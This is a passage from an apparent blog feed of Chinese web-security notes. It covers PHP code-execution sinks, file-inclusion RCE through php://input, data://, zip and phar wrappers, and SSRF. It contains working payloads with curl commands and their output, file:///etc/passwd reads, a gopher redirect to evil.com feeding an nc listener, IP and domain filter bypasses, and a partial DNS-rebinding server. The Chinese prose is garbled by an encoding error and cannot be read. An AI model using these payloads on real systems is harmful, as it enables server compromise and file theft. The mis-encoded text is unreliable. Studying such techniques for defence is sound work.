class="title">lambda</span><span class="params">($a, $b)</span></span>&#123; </span><br><span class="line"><span class="keyword">return</span> strcmp($a[<span class="string">""</span>]);</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">/*"], $b[""]);&#125;phpinfo();/*"]); &#125;</span></span><br></pre></td></tr></table></figure></li><li><p>call_user_func(callable $func, $arg)ï¼Œè°ƒç”¨func($arg)ï¼Œè‹¥funcå¯æŒ‡å®šä¸ºassertåˆ™å­˜åœ¨ä»£ç æ‰§è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">call_user_func($a, $b);</span><br></pre></td></tr></table></figure><p>payloadä¸º<code>a=assert&amp;b=phpinfo()</code></p></li><li><p>call_user_func_array(callable $func , array $args_arr)ï¼Œè°ƒç”¨funcï¼Œå‚æ•°ä¸ºæ•°ç»„<code>$args_arr</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">call_user_func_array($a, $b);</span><br></pre></td></tr></table></figure><p>payloadä¸º<code>a=assert&amp;b[]=phpinfo()</code></p></li><li><p>array_map(callable $func, array $array1 [, array $â€¦ ])ï¼Œå°†arrayä¸­çš„å…ƒç´ åº”ç”¨åˆ°$callbackå‡½æ•°ä¸Šï¼Œæœ‰ç‚¹åƒPythonçš„map</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line">array_map($a, $b);</span><br></pre></td></tr></table></figure><p>payloadä¸º<code>a=assert&amp;b[]=phpinfo()</code></p></li><li>ob_start()ï¼Œç”¨æ³•å¦‚ä¸‹ï¼ˆåªèƒ½æ˜¾ç¤ºä¸€è¡Œï¼‰ï¼š<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = <span class="string">'system'</span>;ob_start($cmd);<span class="keyword">echo</span> <span class="string">"$_GET[a]"</span>;ob_end_flush();</span><br></pre></td></tr></table></figure></li></ul><h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><ul><li>move_uploaded_file()</li><li>getimagesize() //éªŒè¯æ–‡ä»¶å¤´åªè¦ä¸ºGIF89aï¼Œå°±ä¼šè¿”å›çœŸ</li></ul><h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><ul><li>require()ï¼Œç¨‹åºä¸€è¿è¡Œå°±åŒ…å«è¯¥æ–‡ä»¶</li><li>include()ï¼Œæ‰§è¡Œåˆ°includeæ—¶åŒ…å«è¯¥æ–‡ä»¶</li><li>require_once()ï¼Œinclude_once()ï¼šè‹¥å·²åŒ…å«è¿‡åˆ™ä¸å†åŒ…å«</li><li>allow_url_include = onï¼Œæ‰“å¼€è¿œç¨‹æ–‡ä»¶åŒ…å«</li></ul><h1 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h1><ul><li>extract()</li><li>import_request_variables()</li><li>parse_str()</li><li>mb_parse_str()<br>å…¨å±€å˜é‡è¦†ç›–ï¼šregister_globalsä¸ºONï¼Œ$GLOBALS</li></ul><h1 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h1><ul><li><p>php://filterï¼Œç»“åˆbase64è¯»å–æ–‡ä»¶ç”¨ï¼Œå¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://localhost/include.php?file=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=include.php|base64 -d</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100    45  100    45    0     0   5000      0 --:--:-- --:--:-- --:--:--  5000</span><br><span class="line">&lt;?php include(<span class="variable">$_GET</span>[<span class="string">'file'</span>]);?&gt;</span><br></pre></td></tr></table></figure></li><li><p>php://inputï¼Œå°†postä½œä¸ºè¾“å…¥ï¼Œåœ¨<strong>è¿œç¨‹æ–‡ä»¶åŒ…å«</strong>å’Œfile_get_contents()æ—¶å¯ä»¥åˆ©ç”¨é€ æˆRCEï¼Œå¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST http://localhost/include.php?file=php://input --data <span class="string">"&lt;?php system('ls -al');?&gt;"</span></span><br><span class="line">total 126</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 11:22 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121  2117 Sep 21 21:53 aizhixi.php</span><br></pre></td></tr></table></figure></li><li><p>data://ï¼Œå°†dataåçš„getè¯·æ±‚ä½œä¸ºè¾“å…¥ï¼Œåœ¨<strong>è¿œç¨‹æ–‡ä»¶åŒ…å«</strong>æ—¶å¯é€ æˆRCEï¼Œå¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php system('ls -al');?&gt;"</span>|base64</span><br><span class="line">PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo=</span><br><span class="line"></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscyAtYWwnKTs/Pgo="</span></span><br><span class="line">total 126</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 11:22 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121  2117 Sep 21 21:53 aizhixi.php</span><br></pre></td></tr></table></figure></li><li><p>zip://ã€compress.bzip2://ã€compress.zlib://ï¼Œè¯»å–ä¸€ä¸ª.zip/.bz2/.gzæ–‡ä»¶ä¸­çš„æ–‡ä»¶ï¼Œå¯ä»¥å°†ä¸€å¥è¯å‹ç¼©é€ æˆRCEï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"&lt;?php echo system('ls -al');?&gt;"</span> &gt; ls.php</span><br><span class="line">$ zip -r shell.zip ls.php</span><br><span class="line">  adding: ls.php (stored 0%)</span><br><span class="line"><span class="comment"># ä¸Šä¼ å</span></span><br><span class="line">$ curl <span class="string">"http://localhost/include.php?file=phar://./shell.zip/ls.php"</span></span><br><span class="line">total 128</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span><br><span class="line">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span><br><span class="line">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span><br></pre></td></tr></table></figure></li><li><p>phar://ï¼Œè¯»å–ä¸€ä¸ªphar/zipæ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨æˆRCE:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ cat phar.php</span><br><span class="line">&lt;?php</span><br><span class="line">                                                                                                   ?&gt;<span class="string">' ;</span></span><br><span class="line"><span class="string">$phar-&gt;setStub('</span>&lt;?php __HALT_COMPILER();?&gt;<span class="string">');</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">$ php phar.php</span></span><br><span class="line"><span class="string"># ä¸Šä¼ pharå</span></span><br><span class="line"><span class="string">$ curl "http://localhost/include.php?file=phar://./shell.phar/shell.php" --data "cmd=system('</span>ls -al<span class="string">');"</span></span><br><span class="line"><span class="string">12321total 128</span></span><br><span class="line"><span class="string">drwxr-xr-x 1 Anemone 197121     0 Feb  8 16:11 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 1 Anemone 197121     0 May  6  2018 ..</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:56 1075875011_1.jpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 Anemone 197121 27877 Sep 21 20:58 852730535_1.jpg</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>phpä»£ç å®¡è®¡å°æ€»ç»“ï¼Œ<a href="https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://chybeta.github.io/2017/07/14/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%80%BB%E7%BB%93/</a></li><li>å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œçš„å°ç»“ï¼Œ<a href="https://www.anquanke.com/post/id/162128" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162128</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFæˆå› ã€åˆ©ç”¨å’Œé˜²å¾¡</title>
      <link href="/ssrf-SSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/"/>
      <url>/ssrf-SSRF%E6%88%90%E5%9B%A0%E3%80%81%E6%94%BB%E5%87%BB%E5%92%8C%E9%98%B2%E5%BE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRFæˆå› "><a href="#SSRFæˆå› " class="headerlink" title="SSRFæˆå› "></a>SSRFæˆå› </h1><p>SSRFæ˜¯æŒ‡å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨å­˜åœ¨å¯¹å¤–å‘èµ·è¯·æ±‚çš„åŠŸèƒ½ï¼Œè€Œè¯·æ±‚æºå¯ç”±æ”»å‡»è€…æ§åˆ¶å¹¶ä¸”æœåŠ¡å™¨æœ¬èº«æ²¡æœ‰åšåˆæ³•éªŒè¯ï¼Œè¯¸å¦‚å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span></span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">    $ch = CURL_INIT();</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_URL, $url);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_HEADER, <span class="keyword">FALSE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">TRUE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">    <span class="comment">// å…è®¸302è·³è½¬</span></span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">TRUE</span>);</span><br><span class="line">    $res = CURL_EXEC($ch);</span><br><span class="line">    <span class="comment">// è®¾ç½®CONTENT-TYPE</span></span><br><span class="line">    CURL_CLOSE($ch) ;</span><br><span class="line">    <span class="comment">//è¿”å›å“åº”</span></span><br><span class="line">    <span class="keyword">echo</span> $res;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>å°±å¦‚ä¸Šæ–‡æ‰€è¯´ï¼Œé€šè¿‡æ§åˆ¶urlå‚æ•°å¯ä»¥ä½¿æœåŠ¡å™¨å¯è®¿é—®äººä»»æ„ç½‘ç«™ï¼Œå¦‚<a href="http://localhost/ssrf.php?url=http://www.baidu.comï¼š" target="_blank" rel="noopener">http://localhost/ssrf.php?url=http://www.baidu.comï¼š</a></p><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549351620627.png" alt="1549351620627"></p><p>ç”±äºæ˜¯æœåŠ¡ç«¯äº§ç”Ÿçš„è·³è½¬ï¼Œå› æ­¤ç”¨æˆ·è¿™é‡Œçœ‹ä¸åˆ°è®¿é—®ç™¾åº¦çš„è¯·æ±‚ï¼Œä¹Ÿå› æ­¤æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å…¶æ¢ç´¢å†…ç½‘èµ„æºã€‚</p><p>å‚è€ƒçŒªçŒªä¾ çš„PPTï¼Œå®¹æ˜“å‘ç”ŸSSRFæ¼æ´çš„åœ°æ–¹æœ‰ï¼š</p><ul><li>ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆUpload from URLï¼ŒImport &amp; Export RSS feedï¼‰</li><li>æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼ˆOracleã€MongoDBã€MSSQLã€Postgresã€CouchDBï¼‰</li><li>Webmailæ”¶å–å…¶ä»–é‚®ç®±é‚®ä»¶ï¼ˆPOP3ã€IMAPã€SMTPï¼‰</li><li>æ–‡ä»¶å¤„ç†ã€ç¼–ç å¤„ç†ã€å±æ€§ä¿¡æ¯å¤„ç†ï¼ˆffpmgã€ImageMagicã€DOCXã€PDFã€XMLå¤„ç†å™¨ï¼‰<ul><li>FFmpeg: concatï¼š <a href="http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd" target="_blank" rel="noopener">http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd</a></li><li>ImageMagick: fill â€˜url(<a href="http://ssrf.wuyun.org" target="_blank" rel="noopener">http://ssrf.wuyun.org</a>)â€™</li><li>SVG, JPG, XML, Json</li></ul></li></ul><p>å®¹æ˜“å‘ç”ŸSSRFæ¼æ´çš„æœåŠ¡æœ‰ï¼š</p><ol><li>å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</li><li>Webhooks</li><li>é€šè¿‡URLåœ°å€åˆ†äº«ç½‘é¡µå†…å®¹</li><li>è½¬ç æœåŠ¡</li><li>åœ¨çº¿ç¿»è¯‘</li><li>å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</li><li>æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–è°ƒç”¨URLçš„åŠŸèƒ½</li><li>ä»URLå…³é”®å­—ä¸­å¯»æ‰¾</li></ol><h1 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h1><p>æ€»çš„æ¥è¯´ï¼Œä¸€ä¸ªç½‘ç«™å­˜åœ¨SSRFåˆ™ä¼šæœ‰å¦‚ä¸‹åˆ©ç”¨ç‚¹</p><ul><li><p>æœåŠ¡æ¢æµ‹</p><p>å…³é”®åœ¨äºå¯¹é€šè¿‡<strong>æŠ¥é”™ä¿¡æ¯ã€å“åº”æ—¶é—´</strong>åˆ¤æ–­æ˜¯å¦æœåŠ¡æ˜¯å¦å­˜åœ¨</p></li><li><p>æ–‡ä»¶è¯»å–</p><p>ä¸»è¦ä½¿ç”¨fileåè®®å¯¹æ–‡ä»¶è¿›è¡Œè¯»å–æ“ä½œ</p></li><li><p>å¯¹å†…ç½‘æœåŠ¡è¿›è¡Œæ”»å‡»ï¼ˆå¦‚rediså†™æ–‡ä»¶ï¼‰</p></li><li><p>ä½¿ç”¨FastCGIè¿›è¡Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p></li><li><p>SSRFè½¬åå°„å¼XSS</p><p>å¦‚ï¼š<code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></p></li><li><p>åœ¨PDFä¸­åµŒå…¥è„šæœ¬</p><p>ä½¿ç”¨<a href="https://pdfcrowd.com/#convert_by_inputï¼Œå°†htmlåµŒå…¥pdfä¸­ï¼š" target="_blank" rel="noopener">https://pdfcrowd.com/#convert_by_inputï¼Œå°†htmlåµŒå…¥pdfä¸­ï¼š</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">â€file:///etc/passwdâ€</span> <span class="attr">width</span>=<span class="string">â€400</span>" <span class="attr">height</span>=<span class="string">â€400</span>"&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">document.write(document.location)</span>&gt;</span> -- to know the path and some times to know what os they are using at backend</span><br></pre></td></tr></table></figure></li></ul><h2 id="å¯åˆ©ç”¨çš„åè®®"><a href="#å¯åˆ©ç”¨çš„åè®®" class="headerlink" title="å¯åˆ©ç”¨çš„åè®®"></a>å¯åˆ©ç”¨çš„åè®®</h2><p>æ”¯æŒçš„åè®®è¿œä¸æ­¢è¿™äº›ï¼Œä»…åˆ—å‡ºå¸¸ç”¨çš„ï¼š</p><ul><li><p>file://</p><p>ç”¨äºè¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå¦‚ï¼š<code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p></li><li><p>http:// &amp; https://</p><p>ç”¨äºè®¿é—®å†…ç½‘httpæœåŠ¡</p></li><li><p>ftp://</p><p>è®¿é—®FTPæœåŠ¡</p></li><li><p>dict://xxx/info</p><p>å¯ä»¥æ³„éœ²è½¯ä»¶ç‰ˆæœ¬ï¼Œæˆ–æ˜¯æ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</p></li><li><p>gopher://</p><p>javaæ”¯æŒï¼Œphpéœ€è¦å¼€å¯Gopher wrapperï¼Œ%0aç”¨äºæ¢è¡Œï¼Œå…·ä½“ç”¨æ³•å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php</span><br><span class="line">&lt;?php</span><br><span class="line">        header(&apos;Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest&apos;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">evil.com:# nc -v -l 12346</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12346)</span><br><span class="line">Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)</span><br><span class="line">HI</span><br><span class="line">Multiline</span><br><span class="line">test</span><br></pre></td></tr></table></figure></li></ul><h1 id="ç»•è¿‡æ–¹å¼"><a href="#ç»•è¿‡æ–¹å¼" class="headerlink" title="ç»•è¿‡æ–¹å¼"></a>ç»•è¿‡æ–¹å¼</h1><h2 id="ç»•è¿‡IPé™åˆ¶"><a href="#ç»•è¿‡IPé™åˆ¶" class="headerlink" title="ç»•è¿‡IPé™åˆ¶"></a>ç»•è¿‡IPé™åˆ¶</h2><h3 id="åå…­è¿›åˆ¶IP"><a href="#åå…­è¿›åˆ¶IP" class="headerlink" title="åå…­è¿›åˆ¶IP"></a>åå…­è¿›åˆ¶IP</h3><p>å¦‚ï¼š0xA000001=10.0.0.1</p><h3 id="åè¿›åˆ¶IP"><a href="#åè¿›åˆ¶IP" class="headerlink" title="åè¿›åˆ¶IP"></a>åè¿›åˆ¶IP</h3><p>å¦‚ï¼š167772161=10.0.0.1</p><h3 id="å…«è¿›åˆ¶IP"><a href="#å…«è¿›åˆ¶IP" class="headerlink" title="å…«è¿›åˆ¶IP"></a>å…«è¿›åˆ¶IP</h3><p>å¦‚ 012.0.0.1=10.0.0.1</p><h2 id="ç»•è¿‡Domainé™åˆ¶"><a href="#ç»•è¿‡Domainé™åˆ¶" class="headerlink" title="ç»•è¿‡Domainé™åˆ¶"></a>ç»•è¿‡Domainé™åˆ¶</h2><h3 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a><a href="http://xip.io" target="_blank" rel="noopener">xip.io</a></h3><ul><li>å¦‚ï¼š<a href="http://www.baidu.com.192.168.1.10.xip.ioï¼ˆå°†www.baidu.comåœ°å€è§£æåˆ°192.168.1.10ï¼‰" target="_blank" rel="noopener">http://www.baidu.com.192.168.1.10.xip.ioï¼ˆå°†www.baidu.comåœ°å€è§£æåˆ°192.168.1.10ï¼‰</a></li></ul><h3 id="nip-io"><a href="#nip-io" class="headerlink" title="nip.io"></a><a href="http://nip.io/" target="_blank" rel="noopener">nip.io</a></h3><h3 id="ç‰¹æ®Šå­—æ¯"><a href="#ç‰¹æ®Šå­—æ¯" class="headerlink" title="ç‰¹æ®Šå­—æ¯"></a>ç‰¹æ®Šå­—æ¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ = example.com</span><br><span class="line"></span><br><span class="line">List:</span><br><span class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</span><br></pre></td></tr></table></figure><h3 id="HTTP-åŸºç¡€è®¤è¯"><a href="#HTTP-åŸºç¡€è®¤è¯" class="headerlink" title="HTTP åŸºç¡€è®¤è¯"></a>HTTP åŸºç¡€è®¤è¯</h3><p>å¦‚ï¼š<a href="http://xxx.com@attacker.com" target="_blank" rel="noopener">http://xxx.com@attacker.com</a></p><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>åŸºæœ¬åŸç†æ˜¯è‡ªå»ºDNSæœåŠ¡å™¨ï¼Œä½¿ç¬¬ä¸€æ¬¡è§£æä¸ºå¤–ç½‘ipï¼Œç¬¬äºŒæ¬¡è§£æä¸ºå†…ç½‘ip</p><p>åœ¨è‡ªå·±åŸŸåä¸Šç»‘å®šAè®°å½•å’ŒNSè®°å½•ï¼š</p><p><img src="/ssrf-SSRFæˆå› ã€æ”»å‡»å’Œé˜²å¾¡/1549437045205.png" alt="1549437045205"></p><p>Aè®°å½•æŒ‡å°†ns1.anemone.topè§£æåˆ°118.x.x.184</p><p>NSè®°å½•æŒ‡å­åŸŸåtest.anemone.topç”±ns1.anemone.topæ¥è§£æ</p><p>åŒæ—¶åœ¨ä¸€ä¸ªdnsæœåŠ¡ï¼ˆè¿™é‡Œæˆ‘åœ¨è…¾è®¯äº‘ä¸Šæ²¡è¯•éªŒæˆåŠŸï¼ŒçŒœæµ‹æ˜¯è…¾è®¯äº‘å±è”½äº†udpç«¯å£çš„å…¥å‘ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @file dns_server.py</span></span><br><span class="line"><span class="comment"># @brief dns_server</span></span><br><span class="line"><span class="comment"># @author Anemone95,x565178035@126.com</span></span><br><span class="line"><span class="comment"># @version 1.0</span></span><br><span class="line"><span class="comment"># @date 2019-02-06 14:58</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        